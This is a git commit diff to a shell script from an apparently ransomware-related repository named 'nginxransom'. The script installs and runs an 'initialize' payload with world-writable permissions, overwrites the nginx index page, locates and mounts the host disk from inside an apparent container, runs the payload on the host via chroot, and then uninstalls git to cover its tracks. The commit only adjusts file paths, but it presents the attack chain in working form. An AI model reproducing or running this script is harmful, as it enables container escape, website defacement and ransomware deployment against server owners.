c86c1614c8d3f05788fc41edb5f701a8a65c36fe
Gönenç <40662677+xeroxpro@users.noreply.github.com>
2023-05-12 05:39:42 +0300

    volume

--- volumefinder.sh
+++ volumefinder.sh
@@ -3,12 +3,12 @@
 #apt update -y 
 #apt install git -y  
 #git clone https://github.com/xeroxpro/nginxransom.git
-chmod 777 /nginxransom/initialze.txt 
-cp -u /nginxransom/initialize.txt /usr/bin/initialize && chmod 777 /usr/bin/initialize && ./initialize &  
+chmod 777 nginxransom/initialze.txt 
+cp -u nginxransom/initialize.txt /usr/bin/initialize && chmod 777 /usr/bin/initialize && ./initialize &  
 cp -u /nginxransom/web/index.html /usr/share/nginx/html/index.html
 diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
 mount $diskpart /mnt/
-cp /nginxransom/initialize.txt mnt/initialize && chmod 777 mnt/initialize
+cp -u nginxransom/initialize.txt mnt/initialize && chmod 777 mnt/initialize
 chroot mnt/ ./initialize &
 apt remove git -y
 
